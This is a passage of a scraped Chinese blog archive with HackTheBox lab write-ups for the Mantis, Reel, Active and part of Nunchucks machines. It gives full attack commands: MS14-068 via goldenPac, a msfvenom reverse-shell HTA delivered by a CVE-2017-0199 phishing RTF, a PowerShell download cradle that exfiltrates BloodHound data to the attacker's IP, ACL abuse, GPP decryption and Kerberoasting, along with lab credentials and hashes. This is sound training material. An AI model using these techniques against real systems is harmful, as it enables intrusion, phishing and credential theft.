ldapssl1337/tcp open waste1433/tcp open ms-sql-s3268/tcp open globalcatLDAP3269/tcp open globalcatLDAPssl5722/tcp open msdfsr8080/tcp open http-proxy9389/tcp open adws47001/tcp open winrm49152/tcp open unknown49153/tcp open unknown49154/tcp open unknown49155/tcp open unknown49157/tcp open unknown49158/tcp open unknown49164/tcp open unknown49165/tcp open unknown49168/tcp open unknown50255/tcp open unknownNmap done: 1 IP address (1 host up) scanned in 903.78 seconds 8080是一个Orchard Blog： 任意构造404能够得到login链接： 1337直接访问是IIS默认页面： 目录扫描1337端口目录扫描，得到一个目录： 1234gobuster dir -u http://10.10.10.52:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50.../secure_notes (Status: 301)... dev_notes这个是OrchardCMS相关文档，里面有admin密码信息： 12345678910111213dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt1. Download OrchardCMS2. Download SQL server 2014 Express ,create user \"admin\",and create orcharddb database3. Launch IIS and add new website and point to Orchard CMS folder location.4. Launch browser and navigate to http://localhost:80805. Set admin password and configure sQL server connection string.6. Add blog pages with admin user.# 这里中间很多空行，页面最下面还有Credentials stored in secure formatOrchardCMS admin creadentials 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001SQL Server sa credentials file namez blog admin password上面得到的是密码的二进制形式，解码得到密码： 1@dm!n_P@ssW0rd! 但这个管理界面没什么可利用的地方： sql password另外这个文件名base64 hex解码后得到的就是数据库密码,用户名是admin： 1m$$ql_S@_P@ssW0rd! orcharddb然后连接数据库查看信息，得到用户名密码信息： 1234567SELECT name FROM master.dbo.sysdatabases;SELECT * FROM orcharddb.INFORMATION_SCHEMA.TABLES;SELECT * FROM orcharddb.INFORMATION_SCHEMA.COLUMNS;USE orcharddb;SELECT * FROM blog_Orchard_Users_UserPartRecord;james@htb.local james J@m3s_P@ssW0rd! MS14-068james用户账号密码可以rpc登录获取一些信息，但不能wmi,psexec之类的方式得到shell： 12345678910➜ Mantis rpcclient -U htb.local/james 10.10.10.52Enter HTB.LOCAL\\james's password:rpcclient $&gt; enumdomusersuser:[Administrator] rid:[0x1f4]user:[Guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[james] rid:[0x44f]rpcclient $&gt; lookupnames jamesjames S-1-5-21-4220043660-4019079961-2895681657-1103 (User: 1)rpcclient $&gt; 搜索之后尝试ms14-068: （转）MS14-068域内提权漏洞总结 - 渗透测试中心 - 博客园https://www.cnblogs.com/backlion/p/6820744.html goldenPac需要加一下hosts： 110.10.10.52 htb.local mantis.htb.local 可以一步步来，也可以直接用impacket自带的goldenPac.py一键打： 1python3 goldenPac.py htb.local/james:J@m3s_P@ssW0rd\\!@mantis.htb.local flags然后直接去读取user.txt和root.txt: 12type C:\\Users\\james\\desktop\\user.txttype C:\\Users\\administrator\\desktop\\root.txt 参考资料 （转）MS14-068域内提权漏洞总结 - 渗透测试中心 - 博客园https://www.cnblogs.com/backlion/p/6820744.html HTB: Mantis | 0xdf hacks stuffhttps://0xdf.gitlab.io/2020/09/03/htb-mantis.html https://www.hackthebox.eu/home/machines/writeup/98 HackTheBox - Mantis - YouTubehttps://www.youtube.com/watch?v=VVZZgqIyD0Q&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Reel - HackTheBox","slug":"Reel-HackTheBox","date":"2020-11-17T07:41:59.000Z","updated":"2020-11-17T07:44:56.704Z","comments":true,"path":"2020/11/17/Reel-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/11/17/Reel-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/143 10.10.10.77 端口扫描123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116$ nmap -sC -sV -Pn 10.10.10.77Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-17 13:47 CSTNmap scan report for 10.10.10.77Host is up (0.068s latency).Not shown: 992 filtered portsPORT STATE SERVICE VERSION21/tcp open ftp Microsoft ftpd| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_05-28-18 11:19PM &lt;DIR&gt; documents| ftp-syst:|_ SYST: Windows_NT22/tcp open ssh OpenSSH 7.6 (protocol 2.0)| ssh-hostkey:| 2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)| 256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)|_ 256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)25/tcp open smtp?| fingerprint-strings:| DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe:| 220 Mail Service ready| FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:| 220 Mail Service ready| sequence of commands| sequence of commands| Hello:| 220 Mail Service ready| EHLO Invalid domain address.| Help:| 220 Mail Service ready| DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY| SIPOptions:| 220 Mail Service ready| sequence of commands| sequence of commands| sequence of commands| sequence of commands| sequence of commands| sequence of commands| sequence of commands| sequence of commands| sequence of commands| sequence of commands| sequence of commands| TerminalServerCookie:| 220 Mail Service ready|_ sequence of commands| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP,|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049159/tcp open msrpc Microsoft Windows RPC1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port25-TCP:V=7.91%I=7%D=11/17%Time=5FB36420%P=x86_64-apple-darwin19.6.0SF:%r(NULL,18,\"220\\x20Mail\\x20Service\\x20ready\\r\\n\")%r(Hello,3A,\"220\\x20MaSF:il\\x20Service\\x20ready\\r\\n501\\x20EHLO\\x20Invalid\\x20domain\\x20address\\.SF:\\r\\n\")%r(Help,54,\"220\\x20Mail\\x20Service\\x20ready\\r\\n211\\x20DATA\\x20HELSF:O\\x20EHLO\\x20MAIL\\x20NOOP\\x20QUIT\\x20RCPT\\x20RSET\\x20SAML\\x20TURN\\x20VRSF:FY\\r\\n\")%r(GenericLines,54,\"220\\x20Mail\\x20Service\\x20ready\\r\\n503\\x20BSF:ad\\x20sequence\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20comSF:mands\\r\\n\")%r(GetRequest,54,\"220\\x20Mail\\x20Service\\x20ready\\r\\n503\\x20SF:Bad\\x20sequence\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20coSF:mmands\\r\\n\")%r(HTTPOptions,54,\"220\\x20Mail\\x20Service\\x20ready\\r\\n503\\xSF:20Bad\\x20sequence\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20SF:commands\\r\\n\")%r(RTSPRequest,54,\"220\\x20Mail\\x20Service\\x20ready\\r\\n503SF:\\x20Bad\\x20sequence\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequence\\x20of\\xSF:20commands\\r\\n\")%r(RPCCheck,18,\"220\\x20Mail\\x20Service\\x20ready\\r\\n\")%rSF:(DNSVersionBindReqTCP,18,\"220\\x20Mail\\x20Service\\x20ready\\r\\n\")%r(DNSStSF:atusRequestTCP,18,\"220\\x20Mail\\x20Service\\x20ready\\r\\n\")%r(SSLSessionReSF:q,18,\"220\\x20Mail\\x20Service\\x20ready\\r\\n\")%r(TerminalServerCookie,36,\"SF:220\\x20Mail\\x20Service\\x20ready\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20commSF:ands\\r\\n\")%r(TLSSessionReq,18,\"220\\x20Mail\\x20Service\\x20ready\\r\\n\")%r(SF:Kerberos,18,\"220\\x20Mail\\x20Service\\x20ready\\r\\n\")%r(SMBProgNeg,18,\"220SF:\\x20Mail\\x20Service\\x20ready\\r\\n\")%r(X11Probe,18,\"220\\x20Mail\\x20ServicSF:e\\x20ready\\r\\n\")%r(FourOhFourRequest,54,\"220\\x20Mail\\x20Service\\x20readSF:y\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequenceSF:\\x20of\\x20commands\\r\\n\")%r(LPDString,18,\"220\\x20Mail\\x20Service\\x20readSF:y\\r\\n\")%r(LDAPSearchReq,18,\"220\\x20Mail\\x20Service\\x20ready\\r\\n\")%r(LDASF:PBindReq,18,\"220\\x20Mail\\x20Service\\x20ready\\r\\n\")%r(SIPOptions,162,\"22SF:0\\x20Mail\\x20Service\\x20ready\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20commanSF:ds\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequencSF:e\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20commands\\r\\n503\\SF:x20Bad\\x20sequence\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequence\\x20of\\x2SF:0commands\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20commands\\r\\n503\\x20Bad\\x20SF:sequence\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20commands\\SF:r\\n503\\x20Bad\\x20sequence\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequence\\xSF:20of\\x20commands\\r\\n\");Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 1s, deviation: 2s, median: 0s| smb-os-discovery:| OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)| OS CPE: cpe:/o:microsoft:windows_server_2012::-| Computer name: REEL| NetBIOS computer name: REEL\\x00| Domain name: HTB.LOCAL| Forest name: HTB.LOCAL| FQDN: REEL.HTB.LOCAL|_ System time: 2020-11-17T05:51:01+00:00| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: required| smb2-security-mode:| 2.02:|_ Message signing enabled and required| smb2-time:| date: 2020-11-17T05:50:58|_ start_date: 2020-11-17T05:44:17Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 251.10 seconds FTPftp可以匿名访问： AppLocker.docx里面就一句话： AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect. readme.txt也是很少的内容： please email me any rtf format procedures - I’ll review and convert. new format / converted documents will be saved here. Windows Event Forwarding.docx是一些日志信息，在元数据中得到一个邮箱地址 nico@megabank.com : 123456789101112131415161718192021222324252627282930313233343536373839404142$ exiftool Windows\\ Event\\ Forwarding.docxExifTool Version Number : 12.00File Name : Windows Event Forwarding.docxDirectory : .File Size : 14 kBFile Modification Date/Time : 2020:11:17 13:51:41+08:00File Access Date/Time : 2020:11:17 13:52:20+08:00File Inode Change Date/Time : 2020:11:17 13:55:59+08:00File Permissions : rw-r--r--File Type : DOCXFile Type Extension : docxMIME Type : application/vnd.openxmlformats-officedocument.wordprocessingml.documentZip Required Version : 20Zip Bit Flag : 0x0006Zip Compression : DeflatedZip Modify Date : 1980:01:01 00:00:00Zip CRC : 0x82872409Zip Compressed Size : 385Zip Uncompressed Size : 1422Zip File Name : [Content_Types].xmlCreator : nico@megabank.comRevision Number : 4Create Date : 2017:10:31 18:42:00ZModify Date : 2017:10:31 18:51:00ZTemplate : Normal.dotmTotal Edit Time : 5 minutesPages : 2Words : 299Characters : 1709Application : Microsoft Office WordDoc Security : NoneLines : 14Paragraphs : 4Scale Crop : NoHeading Pairs : Title, 1Titles Of Parts :Company :Links Up To Date : NoCharacters With Spaces : 2004Shared Doc : NoHyperlinks Changed : NoApp Version : 14.0000 SMTP就是手工尝试发现接受任意reel.htb邮箱，然后进行枚举 smtp-user-enum123456789101112131415161718192021222324252627282930➜ Reel smtp-user-enum -M RCPT -U users.txt -t 10.10.10.77Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum ) ----------------------------------------------------------| Scan Information | ----------------------------------------------------------Mode ..................... RCPTWorker Processes ......... 5Usernames file ........... users.txtTarget count ............. 1Username count ........... 15Target TCP port .......... 25Query timeout ............ 5 secsTarget domain ............######## Scan started at Thu Nov 12 20:06:01 2020 #########10.10.10.77: reel@htb exists10.10.10.77: reel@htb.local exists10.10.10.77: administrator@htb exists10.10.10.77: admin@htb exists10.10.10.77: reel@reel.htb exists10.10.10.77: root@htb exists10.10.10.77: sadfasdfasdfasdf@htb exists10.10.10.77: nico@megabank.com exists10.10.10.77: htb@metabank.com exists######## Scan completed at Thu Nov 12 20:06:03 2020 #########9 results.15 queries in 2 seconds (7.5 queries / sec) users.txt1234567891011121314reeladministratoradminrootreel@htbreel@htb.localreel@reel.htbadministrator@htbadmin@htbroot@htbsadfasdfasdfasdf@htbnico@megabank.com0xdf@megabank.comhtb@metabank.com RTF vuln上面的readme中提示了email rtf格式文件，相关漏洞： bhdresh/CVE-2017-0199: Exploit toolkit CVE-2017-0199 - v4.0 is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft Office RCE. It could generate a malicious RTF/PPSX file and deliver metasploit / meterpreter / other payload to victim without any complex configuration.https://github.com/bhdresh/CVE-2017-0199 生成hta首先直接msfvenom生成一个恶意hta： 1msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f hta-psh -o msfv.hta 生成RTF然后直接用漏洞利用脚本生成RTF文件： 1python CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w invoice.rtf -u http://10.10.14.6/msfv.hta -t rtf -x 0 sendemail &amp;&amp; getshell然后准备就绪，发送钓鱼邮件，getshell： 123sudo python -m SimpleHTTPServer 80nc -lvvp 443sendEmail -f miao@megabank.com -t nico@megabank.com -u \"Invoice Attached\" -m \"You are overdue payment\" -a invoice.rtf -s 10.10.10.77 -v msf一键msf有exploit/windows/fileformat/office_word_hta这个模块，可以一键生成hta，rtf文件，启动监听，只需要自己sendemail就可以 user flag得到的nico用户shell，桌面得到user.txt: nico to tomcred.xmlnico用户桌面有个cred.xml文件,里面是tom账号认证信息： 12345678910111213&lt;Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\"&gt; &lt;Obj RefId=\"0\"&gt; &lt;TN RefId=\"0\"&gt; &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt; &lt;T&gt;System.Object&lt;/T&gt; &lt;/TN&gt; &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt; &lt;Props&gt; &lt;S N=\"UserName\"&gt;HTB\\Tom&lt;/S&gt; &lt;SS N=\"Password\"&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692&lt;/SS&gt; &lt;/Props&gt; &lt;/Obj&gt;&lt;/Objs&gt; creds直接用powersell解析这个xml，得到tom用户的密码： 123456powershell -c &quot;$cred &#x3D; Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *&quot;UserName : TomPassword : 1ts-mag1c!!!SecurePassword : System.Security.SecureStringDomain : HTB ssh注意前面开了22端口SSH，tom账号可以直接ssh登录： 提权信息tom用户桌面AD Audit目录直接有BloodHound(这个确实是靶机原本就有的，不是别人传的)和一个note.txt： groups根据提示信息，去看一下其他用户组,发现Backup_Admins组，这类用户组一般都有特权： 1234567891011121314151617$groups = [adsi] \"LDAP://REEL:389/OU=Groups,DC=HTB,DC=LOCAL\"$searcher = New-Object System.DirectoryServices.DirectorySearcher $groups$searcher.Filter = '(objectClass=Group)'$results = $searcher.FindAll()foreach ($result in $results) &#123;$group = $result.Properties;$group.name&#125;Backup_AdminsAppLocker_TestSharePoint_AdminsDR_SiteSQL_AdminsHelpDesk_AdminsRestrictionsAll_StaffMegaBank_UsersFinance_UsersHR_Team note.txt Findings: Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query). Maybe we should re-run Cypher query against other groups we’ve created. BloodHound虽然靶机里有bloodhound的结果，但因为现在新版本格式已经改变了，自己重新传一个跑一下，结果拿回来分析，传输结果麻烦点，base64编码解码还原成zip： 1234567IEX (New-Object Net.Webclient).downloadstring(\"http://10.10.14.6:9999/SharpHound.ps1\")Invoke-BloodHound -CollectionMethod All$Base64String = [System.convert]::ToBase64String((Get-Content -Path 'c:/temp/20201117065659_BloodHound.zip' -Encoding Byte))Invoke-WebRequest -Uri http://10.10.14.6:4445 -Method POST -Body $Base64Stringecho &lt;base64 encoded zip file&gt; | base64 -d -w 0 &gt; bloodhound_reel.zip 简单分析，发现tom用户可以通过claire用户到Backup_Admins： tom to claire就是导入powerview，根据bloodhound信息一步步,然后就可以用我们设置的密码ssh登录claire账户： 12345678910# 导入powerview. .\\PowerView.ps1# 将tom设置为claire的ACL的所有者Set-DomainObjectOwner -identity claire -OwnerIdentity tom# 授予tom权限以更改该ACL上的密码Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword# 创建一个凭证，然后设置克莱尔的密码$cred = ConvertTo-SecureString \"qwer1234QWER!@#$\" -AsPlainText -forceSet-DomainUserPassword -identity claire -accountpassword $cred# 以上操作建议直接一次性复制粘贴，有自动重置 claire to Backup_Admins根据bloodhound的信息，claire对Backup_Admins有GenericWrite权限，还是一步步,(预期是到backup，bloodhound给的提示是能到domain admin的： 12net group backup_admins claire /add# 添加到backup_admins组后需要重新登录才会生效 Backup_Admins to Administrator查看权限，backup_admins对Administrator有完全访问权限： 1234567claire@REEL C:\\Users&gt;icacls AdministratorAdministrator NT AUTHORITY\\SYSTEM:(OI)(CI)(F) HTB\\Backup_Admins:(OI)(CI)(F) HTB\\Administrator:(OI)(CI)(F) BUILTIN\\Administrators:(OI)(CI)(F)Successfully processed 1 files; Failed processing 0 files 但直接去读root.txt还是被禁止： Backup Scripts 备份脚本里得到admin密码： 12# admin password$password=\"Cr4ckMeIfYouC4n!\" root flag然后就直接登录Administrator，桌面得到root.txt: 参考资料 smtp-user-enum | pentestmonkeyhttp://pentestmonkey.net/tools/user-enumeration/smtp-user-enum bhdresh/CVE-2017-0199: Exploit toolkit CVE-2017-0199 - v4.0 is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft Office RCE. It could generate a malicious RTF/PPSX file and deliver metasploit / meterpreter / other payload to victim without any complex configuration.https://github.com/bhdresh/CVE-2017-0199 HTB: Reel | 0xdf hacks stuffhttps://0xdf.gitlab.io/2018/11/10/htb-reel.html https://www.hackthebox.eu/home/machines/writeup/143 HackTheBox - Reel - YouTubehttps://www.youtube.com/watch?v=ob9SgtFm6_g&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Active - HackTheBox","slug":"Active-HackTheBox","date":"2020-11-11T06:13:22.000Z","updated":"2020-11-11T06:38:35.848Z","comments":true,"path":"2020/11/11/Active-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/11/11/Active-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/148 10.10.10.100 端口扫描域服务器： 12345678910111213141516171819202122232425262728293031323334353637$ nmap -sC -sV 10.10.10.100Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-11 13:36 CSTNmap scan report for 10.10.10.100Host is up (0.069s latency).Not shown: 983 closed portsPORT STATE SERVICE VERSION53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)| dns-nsid:|_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-11-11 05:36:48Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)3269/tcp open tcpwrapped49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049158/tcp open msrpc Microsoft Windows RPCService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windowsHost script results:| smb2-security-mode:| 2.02:|_ Message signing enabled and required| smb2-time:| date: 2020-11-11T05:37:43|_ start_date: 2020-11-11T05:12:05Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 73.72 seconds SMBsmb可以匿名访问： Replication这个目录下有GPP的Groups.xml文件： Groups.xml123&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;Groups clsid=\"&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;\"&gt;&lt;User clsid=\"&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;\" name=\"active.htb\\SVC_TGS\" image=\"2\" changed=\"2018-07-18 20:46:06\" uid=\"&#123;EF57DA28-5F69-4530-A59E-AAB58578219D&#125;\"&gt;&lt;Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"active.htb\\SVC_TGS\"/&gt;&lt;/User&gt;&lt;/Groups&gt; gpp-decrypt直接用gpp-decrypt可以解出来密码： 1234➜ Groups gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQGPPstillStandingStrong2k18# username : active.htb\\SVC_TGS SVC_TGS SMB然后使用这个账号继续枚举信息： UsersUsers就是C盘Users目录，user.txt在SVC_TGS用户桌面目录 user flag Kerberoasting关于Kerberoasting详细看三好学生博客： 域渗透——Kerberoasting – 3gstudent – Good in study, attitude and healthhttps://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/ GetUserSPNs123python3 ~/Tools/impacket/examples/GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$f86e00a3c81a83de26d8b81b3098d6ce$a20055b41dc19de28da68af44f01611d7d52d535b687f82702db97427b72e35d3624093b13f2965210de29f7f83e9cdeb6a74dfb71a86846bfde4ad75e6cbcb0f137019f9d18afce89290f249e5059724aa278dea30dde16f8fe72c83f3abb0602acd8e123b2fb0c03bb6e184cc2f41b607153bed40e186a57f0f6a5726188f074cbb8da07ef73639058ae7f4fe83e4342df422526ff30886023c79de35250d1b8d48fa0441e059bd1e4adc3e38398fa94dad9ad56510ed34a0964a9427706b9d3f4bf905d92a7593fa86ceff56a5db21febdce3b7ae6755f8c0b81d4d868e8b94239c74135e1b7130b88883d819e9e05125251978ccd69bdfb2cef32c3a6f8ce966d35937c85c6ac92e0c9429bea32a63acd773db1b6b07fa8c08d014837181952eac1076cf0415eb5f3aa8d7849ed3d72521069286b3df5462960f71ad28c5a8b0870e9abf87f85015d0c27d531d4c192f03a2c74e22ca1daa5745cfdd362a2095f33068917e07977a290434a21fecfaf586760abeff4186fe81d5d45089523eccbbc11be4c8c4470b19a2c0ac897310c6aa49c13a26a42b418993708d15e6695dec7126cd8275caf7230834158e09a3d994e55a4fe67433806a10afb3b16632e6774f79fbbc813fb63d75cd4393cda2db5eb3a98ee7e0b8f53b35d03c9bdf9866e53c6d3d7f21060c4c889e4ae9fdcf434a695b87eaadf31f269871f21b97ad12ff2afb55e3bc3ea0f8dfaa1389a49b2d7d3eaa374a9a1bb55a549bdd788f96e96bf134e26095f7d88ad61767cbafbfa30e8ce45c744f4a02499e15f1daa58ce403a14065b66af1d0f7db9b877b460bad71da671919c8995ecdf0dc8107f151a840bbfb96b22ca86f99fa564c83ebddf353bc03f159ad6c5ef7dd872a1da7ac9f8145a27b05c83f569abc280e6cf426407b249ce50b7948653a9876b9702695c157ac8b15cc2ad96467beaba2c1bd5f4f7e705c713d1ba35d45edd11330828324d29bed91b8292d7dffe6a59209ce3aa32d2574dc78535365774dcebe6e62d424627dad4b9de6c0287acd4412285370d46ed914dfaa7c5d9127238a7aff521067838eba6f1b5c30dc1abdb121a28c6adfcc86bc8e4124b52489be32638287e2c946f29dda162e0781858be491b28787bde97150ca319dcefdf6be78bce7df56374d4d221720c48dd21d71a994aa1d16c011c36be5bf45bfdba5e7cb8d83535f30b54fccc7ffffee256affbb0f506c30e23aa24b066453313d john然后破解这个hash，得到Administrator账号密码： 123sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtTicketmaster1968 system shell然后使用这个密码即可得到system shell： root flag在Administrator用户桌面得到root.txt: 参考资料 域渗透——利用SYSVOL还原组策略中保存的密码 – 3gstudent – Good in study, attitude and healthhttps://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/ 域渗透——Kerberoasting – 3gstudent – Good in study, attitude and healthhttps://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/ HTB: Active | 0xdf hacks stuffhttps://0xdf.gitlab.io/2018/12/08/htb-active.html#users-share---smb https://www.hackthebox.eu/home/machines/writeup/148 HackTheBox - Active - YouTubehttps://www.youtube.com/watch?v=jUc1J31DNdw&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Nunchucks - HackTheBox","slug":"Nunchucks-HackTheBox","date":"2020-11-10T07:04:12.000Z","updated":"2021-11-10T07:04:55.828Z","comments":true,"path":"2020/11/10/Nunchucks-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/11/10/Nunchucks-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/414 10.10.11.122 端口扫描22,80,443: 123456789101112131415161718192021222324252627282930$ nmap -sV -sC 10.10.11.122Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-10 14:13 CSTNmap scan report for 10.10.11.122Host is up (0.073s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)| 256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)|_ 256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to https://nunchucks.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)443/tcp open ssl/http nginx 1.18.0 (Ubuntu)| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb| Not valid before: 2021-08-30T15:42:24|_Not valid after: 2031-08-28T15:42:24|_http-title: Nunchucks - Landing Page| tls-alpn:|_ http/1.1|_http-server-header: nginx/1.18.0 (Ubuntu)|_ssl-date: TLS randomness does not represent time| tls-nextprotoneg:|_ http/1.1Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 40.60 seconds 80/443自动跳转域名nunchucks.htb，加hosts访问： vhost子域名可以扫到一个store： 1gobuster vhost -u https://nunchucks.htb -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -k -t 50 store.nunchucks.htb SSTIstore那里输入邮箱地址接收新闻，根据响应头Express，尝试SSTI： nunjucks根据文档及名称，发现使用的模板引擎应该是nunjucks： Template Engineshttps://expressjs.com/en/resources/template-engines.html mozilla/nunjucks: A powerful templating engine with inheritance, asynchronous control, and more (jinja2 inspired)https://github.com/mozilla/nunjucks Sandbox Breakout - A View of the Nunjucks Template 